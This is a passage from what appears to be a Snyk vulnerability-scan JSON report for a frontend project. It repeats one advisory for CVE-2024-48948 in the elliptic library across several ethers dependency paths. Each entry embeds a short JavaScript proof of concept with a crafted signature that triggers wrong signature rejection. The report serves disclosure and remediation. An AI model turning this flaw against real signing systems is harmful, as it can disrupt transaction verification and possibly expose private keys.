            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "cvssV3BaseScore": 4.8,
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.3,
            "cvssVersion": "4.0",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "assigner": "SUSE",
            "severity": "medium",
            "baseScore": 4.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "description": "## Overview\n[elliptic](https://www.npmjs.com/package/elliptic) is a fast elliptic-curve cryptography implementation in plain javascript.\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature due to an anomaly in the `_truncateToN` function. An attacker can cause legitimate transactions or communications to be incorrectly flagged as invalid by exploiting the signature verification process when the hash contains at least four leading 0 bytes, and the order of the elliptic curve's base point is smaller than the hash.\r\n\r\nIn some situations, a private key exposure is possible. This can happen when an attacker knows a faulty and the corresponding correct signature for the same message.\r\n\r\n**Note:** Although the vector for exploitation of this vulnerability was restricted with the release of versions 6.6.0 and 6.6.1, it remains possible to generate invalid signatures in some cases in those releases as well.\n## PoC\n```javascript\r\nvar elliptic = require('elliptic'); // tested with version 6.5.7\r\nvar hash = require('hash.js');\r\nvar BN = require('bn.js');\r\nvar toArray = elliptic.utils.toArray;\r\n\r\nvar ec = new elliptic.ec('p192');\r\nvar msg = '343236343739373234';\r\nvar sig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b';\r\n// Same public key just in different formats\r\nvar pk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723';\r\nvar pkPem = '-----BEGIN PUBLIC KEY-----\\nMEkwEwYHKoZIzj0CAQYIKoZIzj0DAQEDMgAEzTWgsY7rj82H/wGXgAEoKHRfBG54\\nXeuigVDeG+bLQ3ZSMAa+/zD/CbQEkSXO0pcj\\n-----END PUBLIC KEY-----\\n';\r\n\r\n// Create hash\r\nvar hashArray = hash.sha256().update(toArray(msg, 'hex')).digest();\r\n// Convert array to string (just for showcase of the leading zeros)\r\nvar hashStr = Array.from(hashArray, function(byte) {\r\n  return ('0' + (byte & 0xFF).toString(16)).slice(-2);\r\n}).join('');\r\nvar hMsg = new BN(hashArray, 'hex');\r\n// Hashed message contains 4 leading zeros bytes\r\nconsole.log('sha256 hash(str): ' + hashStr);\r\n// Due to using BN bitLength lib it does not calculate the bit length correctly (should be 32 since it is a sha256 hash)\r\nconsole.log('Byte len of sha256 hash: ' + hMsg.byteLength());\r\nconsole.log('sha256 hash(BN): ' + hMsg.toString(16));\r\n\r\n// Due to the shift of the message to be within the order of the curve the delta computation is invalid\r\nvar pubKey = ec.keyFromPublic(toArray(pk, 'hex'));\r\nconsole.log('Valid signature: ' + pubKey.verify(hashStr, sig));\r\n\r\n// You can check that this hash should validate by consolidating openssl\r\nconst fs = require('fs');\r\nfs.writeFile('msg.bin', new BN(msg, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('sig.bin', new BN(sig, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('cert.pem', pkPem, (err) => {\r\n  if (err) throw err;\r\n});\r\n\r\n// To verify the correctness of the message signature and key one can run:\r\n// openssl dgst -sha256 -verify cert.pem -signature sig.bin msg.bin\r\n// Or run this python script\r\n/*\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.asymmetric import ec\r\n\r\n\r\nmsg = '343236343739373234'\r\nsig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b'\r\npk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723'\r\n\r\np192 = ec.SECP192R1()\r\npk = ec.EllipticCurvePublicKey.from_encoded_point(p192, bytes.fromhex(pk))\r\npk.verify(bytes.fromhex(sig), bytes.fromhex(msg), ec.ECDSA(hashes.SHA256()))\r\n*/\r\n```\n## Remediation\nThere is no fixed version for `elliptic`.\n## References\n- [GitHub Commit](https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf)\n- [GitHub Issue](https://github.com/indutny/elliptic/issues/321)\n- [GitHub PR](https://github.com/indutny/elliptic/pull/322#issuecomment-2463004218)\n",
        "epssDetails": {
          "percentile": "0.22905",
          "probability": "0.00073",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-48948"
          ],
          "CWE": [
            "CWE-347"
          ],
          "GHSA": [
            "GHSA-fc9h-whq2-v747"
          ]
        },
        "packageName": "elliptic",
        "proprietary": false,
        "creationTime": "2024-10-15T14:28:04.889614Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-10-15T13:45:59Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-10-15T14:28:05.206234Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-01T06:36:09.951681Z",
        "socialTrendAlert": false,
        "severityWithCritical": "critical",
        "from": [
          "frontend@19.0.0",
          "ethers@5.8.0",
          "@ethersproject/contracts@5.8.0",
          "@ethersproject/abi@5.8.0",
          "@ethersproject/hash@5.8.0",
          "@ethersproject/abstract-signer@5.8.0",
          "@ethersproject/abstract-provider@5.8.0",
          "@ethersproject/transactions@5.8.0",
          "@ethersproject/signing-key@5.8.0",
          "elliptic@6.6.1"
        ],
        "upgradePath": [
          false,
          "ethers@6.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "elliptic",
        "version": "6.6.1"
      },
      {
        "id": "SNYK-JS-ELLIPTIC-8187303",
        "title": "Improper Verification of Cryptographic Signature",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
        "credit": [
          "Markus Schiffermüller and Scott Arciszewski"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "critical",
        "cvssScore": 9.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "elliptic",
        "references": [
          {
            "url": "https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/indutny/elliptic/issues/321",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/indutny/elliptic/pull/322%23issuecomment-2463004218",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "low",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 3.7,
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "assigner": "SUSE",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "cvssV3BaseScore": 4.8,
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.3,
            "cvssVersion": "4.0",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "assigner": "SUSE",
            "severity": "medium",
            "baseScore": 4.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "description": "## Overview\n[elliptic](https://www.npmjs.com/package/elliptic) is a fast elliptic-curve cryptography implementation in plain javascript.\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature due to an anomaly in the `_truncateToN` function. An attacker can cause legitimate transactions or communications to be incorrectly flagged as invalid by exploiting the signature verification process when the hash contains at least four leading 0 bytes, and the order of the elliptic curve's base point is smaller than the hash.\r\n\r\nIn some situations, a private key exposure is possible. This can happen when an attacker knows a faulty and the corresponding correct signature for the same message.\r\n\r\n**Note:** Although the vector for exploitation of this vulnerability was restricted with the release of versions 6.6.0 and 6.6.1, it remains possible to generate invalid signatures in some cases in those releases as well.\n## PoC\n```javascript\r\nvar elliptic = require('elliptic'); // tested with version 6.5.7\r\nvar hash = require('hash.js');\r\nvar BN = require('bn.js');\r\nvar toArray = elliptic.utils.toArray;\r\n\r\nvar ec = new elliptic.ec('p192');\r\nvar msg = '343236343739373234';\r\nvar sig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b';\r\n// Same public key just in different formats\r\nvar pk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723';\r\nvar pkPem = '-----BEGIN PUBLIC KEY-----\\nMEkwEwYHKoZIzj0CAQYIKoZIzj0DAQEDMgAEzTWgsY7rj82H/wGXgAEoKHRfBG54\\nXeuigVDeG+bLQ3ZSMAa+/zD/CbQEkSXO0pcj\\n-----END PUBLIC KEY-----\\n';\r\n\r\n// Create hash\r\nvar hashArray = hash.sha256().update(toArray(msg, 'hex')).digest();\r\n// Convert array to string (just for showcase of the leading zeros)\r\nvar hashStr = Array.from(hashArray, function(byte) {\r\n  return ('0' + (byte & 0xFF).toString(16)).slice(-2);\r\n}).join('');\r\nvar hMsg = new BN(hashArray, 'hex');\r\n// Hashed message contains 4 leading zeros bytes\r\nconsole.log('sha256 hash(str): ' + hashStr);\r\n// Due to using BN bitLength lib it does not calculate the bit length correctly (should be 32 since it is a sha256 hash)\r\nconsole.log('Byte len of sha256 hash: ' + hMsg.byteLength());\r\nconsole.log('sha256 hash(BN): ' + hMsg.toString(16));\r\n\r\n// Due to the shift of the message to be within the order of the curve the delta computation is invalid\r\nvar pubKey = ec.keyFromPublic(toArray(pk, 'hex'));\r\nconsole.log('Valid signature: ' + pubKey.verify(hashStr, sig));\r\n\r\n// You can check that this hash should validate by consolidating openssl\r\nconst fs = require('fs');\r\nfs.writeFile('msg.bin', new BN(msg, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('sig.bin', new BN(sig, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('cert.pem', pkPem, (err) => {\r\n  if (err) throw err;\r\n});\r\n\r\n// To verify the correctness of the message signature and key one can run:\r\n// openssl dgst -sha256 -verify cert.pem -signature sig.bin msg.bin\r\n// Or run this python script\r\n/*\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.asymmetric import ec\r\n\r\n\r\nmsg = '343236343739373234'\r\nsig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b'\r\npk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723'\r\n\r\np192 = ec.SECP192R1()\r\npk = ec.EllipticCurvePublicKey.from_encoded_point(p192, bytes.fromhex(pk))\r\npk.verify(bytes.fromhex(sig), bytes.fromhex(msg), ec.ECDSA(hashes.SHA256()))\r\n*/\r\n```\n## Remediation\nThere is no fixed version for `elliptic`.\n## References\n- [GitHub Commit](https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf)\n- [GitHub Issue](https://github.com/indutny/elliptic/issues/321)\n- [GitHub PR](https://github.com/indutny/elliptic/pull/322#issuecomment-2463004218)\n",
        "epssDetails": {
          "percentile": "0.22905",
          "probability": "0.00073",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-48948"
          ],
          "CWE": [
            "CWE-347"
          ],
          "GHSA": [
            "GHSA-fc9h-whq2-v747"
          ]
        },
        "packageName": "elliptic",
        "proprietary": false,
        "creationTime": "2024-10-15T14:28:04.889614Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-10-15T13:45:59Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-10-15T14:28:05.206234Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-01T06:36:09.951681Z",
        "socialTrendAlert": false,
        "severityWithCritical": "critical",
        "from": [
          "frontend@19.0.0",
          "ethers@5.8.0",
          "@ethersproject/hdnode@5.8.0",
          "@ethersproject/wordlists@5.8.0",
          "@ethersproject/hash@5.8.0",
          "@ethersproject/abstract-signer@5.8.0",
          "@ethersproject/abstract-provider@5.8.0",
          "@ethersproject/transactions@5.8.0",
          "@ethersproject/signing-key@5.8.0",
          "elliptic@6.6.1"
        ],
        "upgradePath": [
          false,
          "ethers@6.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "elliptic",
        "version": "6.6.1"
      },
      {
        "id": "SNYK-JS-ELLIPTIC-8187303",
        "title": "Improper Verification of Cryptographic Signature",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
        "credit": [
          "Markus Schiffermüller and Scott Arciszewski"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "critical",
        "cvssScore": 9.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "elliptic",
        "references": [
          {
            "url": "https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/indutny/elliptic/issues/321",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/indutny/elliptic/pull/322%23issuecomment-2463004218",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "low",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 3.7,
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "assigner": "SUSE",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "cvssV3BaseScore": 4.8,
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.3,
            "cvssVersion": "4.0",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "assigner": "SUSE",
            "severity": "medium",
            "baseScore": 4.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "description": "## Overview\n[elliptic](https://www.npmjs.com/package/elliptic) is a fast elliptic-curve cryptography implementation in plain javascript.\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature due to an anomaly in the `_truncateToN` function. An attacker can cause legitimate transactions or communications to be incorrectly flagged as invalid by exploiting the signature verification process when the hash contains at least four leading 0 bytes, and the order of the elliptic curve's base point is smaller than the hash.\r\n\r\nIn some situations, a private key exposure is possible. This can happen when an attacker knows a faulty and the corresponding correct signature for the same message.\r\n\r\n**Note:** Although the vector for exploitation of this vulnerability was restricted with the release of versions 6.6.0 and 6.6.1, it remains possible to generate invalid signatures in some cases in those releases as well.\n## PoC\n```javascript\r\nvar elliptic = require('elliptic'); // tested with version 6.5.7\r\nvar hash = require('hash.js');\r\nvar BN = require('bn.js');\r\nvar toArray = elliptic.utils.toArray;\r\n\r\nvar ec = new elliptic.ec('p192');\r\nvar msg = '343236343739373234';\r\nvar sig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b';\r\n// Same public key just in different formats\r\nvar pk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723';\r\nvar pkPem = '-----BEGIN PUBLIC KEY-----\\nMEkwEwYHKoZIzj0CAQYIKoZIzj0DAQEDMgAEzTWgsY7rj82H/wGXgAEoKHRfBG54\\nXeuigVDeG+bLQ3ZSMAa+/zD/CbQEkSXO0pcj\\n-----END PUBLIC KEY-----\\n';\r\n\r\n// Create hash\r\nvar hashArray = hash.sha256().update(toArray(msg, 'hex')).digest();\r\n// Convert array to string (just for showcase of the leading zeros)\r\nvar hashStr = Array.from(hashArray, function(byte) {\r\n  return ('0' + (byte & 0xFF).toString(16)).slice(-2);\r\n}).join('');\r\nvar hMsg = new BN(hashArray, 'hex');\r\n// Hashed message contains 4 leading zeros bytes\r\nconsole.log('sha256 hash(str): ' + hashStr);\r\n// Due to using BN bitLength lib it does not calculate the bit length correctly (should be 32 since it is a sha256 hash)\r\nconsole.log('Byte len of sha256 hash: ' + hMsg.byteLength());\r\nconsole.log('sha256 hash(BN): ' + hMsg.toString(16));\r\n\r\n// Due to the shift of the message to be within the order of the curve the delta computation is invalid\r\nvar pubKey = ec.keyFromPublic(toArray(pk, 'hex'));\r\nconsole.log('Valid signature: ' + pubKey.verify(hashStr, sig));\r\n\r\n// You can check that this hash should validate by consolidating openssl\r\nconst fs = require('fs');\r\nfs.writeFile('msg.bin', new BN(msg, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('sig.bin', new BN(sig, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('cert.pem', pkPem, (err) => {\r\n  if (err) throw err;\r\n});\r\n\r\n// To verify the correctness of the message signature and key one can run:\r\n// openssl dgst -sha256 -verify cert.pem -signature sig.bin msg.bin\r\n// Or run this python script\r\n/*\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.asymmetric import ec\r\n\r\n\r\nmsg = '343236343739373234'\r\nsig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b'\r\npk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723'\r\n\r\np192 = ec.SECP192R1()\r\npk = ec.EllipticCurvePublicKey.from_encoded_point(p192, bytes.fromhex(pk))\r\npk.verify(bytes.fromhex(sig), bytes.fromhex(msg), ec.ECDSA(hashes.SHA256()))\r\n*/\r\n```\n## Remediation\nThere is no fixed version for `elliptic`.\n## References\n- [GitHub Commit](https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf)\n- [GitHub Issue](https://github.com/indutny/elliptic/issues/321)\n- [GitHub PR](https://github.com/indutny/elliptic/pull/322#issuecomment-2463004218)\n",
        "epssDetails": {
          "percentile": "0.22905",
          "probability": "0.00073",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-48948"
          ],
          "CWE": [
            "CWE-347"
          ],
          "GHSA": [
            "GHSA-fc9h-whq2-v747"
          ]
        },
        "packageName": "elliptic",
        "proprietary": false,
        "creationTime": "2024-10-15T14:28:04.889614Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-10-15T13:45:59Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-10-15T14:28:05.206234Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-01T06:36:09.951681Z",
        "socialTrendAlert": false,
        "severityWithCritical": "critical",
        "from": [
          "frontend@19.0.0",
          "ethers@5.8.0",
          "@ethersproject/wallet@5.8.0",
          "@ethersproject/wordlists@5.8.0",
          "@ethersproject/hash@5.8.0",
          "@ethersproject/abstract-signer@5.8.0",
          "@ethersproject/abstract-provider@5.8.0",
          "@ethersproject/transactions@5.8.0",
          "@ethersproject/signing-key@5.8.0",
          "elliptic@6.6.1"
        ],
        "upgradePath": [
          false,
          "ethers@6.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "elliptic",
        "version": "6.6.1"
      },
      {
        "id": "SNYK-JS-ELLIPTIC-8187303",
        "title": "Improper Verification of Cryptographic Signature",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
        "credit": [
          "Markus Schiffermüller and Scott Arciszewski"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "critical",
        "cvssScore": 9.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "elliptic",
        "references": [
          {
            "url": "https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/indutny/elliptic/issues/321",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/indutny/elliptic/pull/322%23issuecomment-2463004218",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "low",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 3.7,
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "assigner": "SUSE",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "cvssV3BaseScore": 4.8,
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.3,
            "cvssVersion": "4.0",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "assigner": "SUSE",
            "severity": "medium",
            "baseScore": 4.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "description": "## Overview\n[elliptic](https://www.npmjs.com/package/elliptic) is a fast elliptic-curve cryptography implementation in plain javascript.\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature due to an anomaly in the `_truncateToN` function. An attacker can cause legitimate transactions or communications to be incorrectly flagged as invalid by exploiting the signature verification process when the hash contains at least four leading 0 bytes, and the order of the elliptic curve's base point is smaller than the hash.\r\n\r\nIn some situations, a private key exposure is possible. This can happen when an attacker knows a faulty and the corresponding correct signature for the same message.\r\n\r\n**Note:** Although the vector for exploitation of this vulnerability was restricted with the release of versions 6.6.0 and 6.6.1, it remains possible to generate invalid signatures in some cases in those releases as well.\n## PoC\n```javascript\r\nvar elliptic = require('elliptic'); // tested with version 6.5.7\r\nvar hash = require('hash.js');\r\nvar BN = require('bn.js');\r\nvar toArray = elliptic.utils.toArray;\r\n\r\nvar ec = new elliptic.ec('p192');\r\nvar msg = '343236343739373234';\r\nvar sig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b';\r\n// Same public key just in different formats\r\nvar pk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723';\r\nvar pkPem = '-----BEGIN PUBLIC KEY-----\\nMEkwEwYHKoZIzj0CAQYIKoZIzj0DAQEDMgAEzTWgsY7rj82H/wGXgAEoKHRfBG54\\nXeuigVDeG+bLQ3ZSMAa+/zD/CbQEkSXO0pcj\\n-----END PUBLIC KEY-----\\n';\r\n\r\n// Create hash\r\nvar hashArray = hash.sha256().update(toArray(msg, 'hex')).digest();\r\n// Convert array to string (just for showcase of the leading zeros)\r\nvar hashStr = Array.from(hashArray, function(byte) {\r\n  return ('0' + (byte & 0xFF).toString(16)).slice(-2);\r\n}).join('');\r\nvar hMsg = new BN(hashArray, 'hex');\r\n// Hashed message contains 4 leading zeros bytes\r\nconsole.log('sha256 hash(str): ' + hashStr);\r\n// Due to using BN bitLength lib it does not calculate the bit length correctly (should be 32 since it is a sha256 hash)\r\nconsole.log('Byte len of sha256 hash: ' + hMsg.byteLength());\r\nconsole.log('sha256 hash(BN): ' + hMsg.toString(16));\r\n\r\n// Due to the shift of the message to be within the order of the curve the delta computation is invalid\r\nvar pubKey = ec.keyFromPublic(toArray(pk, 'hex'));\r\nconsole.log('Valid signature: ' + pubKey.verify(hashStr, sig));\r\n\r\n// You can check that this hash should validate by consolidating openssl\r\nconst fs = require('fs');\r\nfs.writeFile('msg.bin', new BN(msg, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('sig.bin', new BN(sig, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('cert.pem', pkPem, (err) => {\r\n  if (err) throw err;\r\n});\r\n\r\n// To verify the correctness of the message signature and key one can run:\r\n// openssl dgst -sha256 -verify cert.pem -signature sig.bin msg.bin\r\n// Or run this python script\r\n/*\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.asymmetric import ec\r\n\r\n\r\nmsg = '343236343739373234'\r\nsig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b'\r\npk = 